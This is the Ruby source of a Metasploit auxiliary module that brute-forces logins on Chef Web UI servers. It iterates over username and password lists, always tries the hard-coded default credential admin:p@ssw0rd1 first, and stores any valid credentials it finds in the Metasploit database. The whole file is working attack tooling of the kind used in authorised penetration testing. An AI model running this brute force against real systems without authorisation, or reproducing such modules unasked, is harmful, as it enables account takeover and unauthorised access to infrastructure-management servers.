##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/chef_webui'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Chef Web UI Brute Force Utility',
      'Description'    => %q{
        This module attempts to login to Chef Web UI server instance using username and password
        combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. It
        will also test for the default login (admin:p@ssw0rd1).
      },
      'Author'         =>
        [
          'hdm'
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
      {
        'SSL'         => true,
      }
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('USERNAME', [false, 'The username to specify for authentication', '']),
        OptString.new('PASSWORD', [false, 'The password to specify for authentication', '']),
        OptString.new('TARGETURI', [ true,  'The path to the Chef Web UI application', '/']),
      ])

    deregister_options('PASSWORD_SPRAY')
  end

  #
  # main
  #
  def run_host(ip)
    init_loginscanner(ip)
    msg = @scanner.check_setup
    if msg
      print_brute :level => :error, :ip => rhost, :msg => msg
      return
    end

    print_brute :level=>:status, :ip=>rhost, :msg=>("Found Chef Web UI application at #{datastore['TARGETURI']}")
    bruteforce(ip)
  end

  def bruteforce(ip)
    @scanner.scan! do |result|
      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
          do_report(ip, rport, result)
          :next_user
        when Metasploit::Model::Login::Status::DENIED_ACCESS
          print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
          do_report(ip, rport, result)
          :next_user
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
          end
          invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
          )
          :abort
        when Metasploit::Model::Login::Status::INCORRECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
          end
          invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
          )
      end
    end
  end

  def do_report(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def init_loginscanner(ip)
    @cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    # Always try the default first
    @cred_collection.prepend_cred(
      Metasploit::Framework::Credential.new(public: 'admin', private: 'p@ssw0rd1')
    )

    @scanner = Metasploit::Framework::LoginScanner::ChefWebUI.new(
      configure_http_login_scanner(
        uri:                datastore['TARGETURI'],
        cred_details:       @cred_collection,
        stop_on_success:    datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword']
      )
    )
  end
end
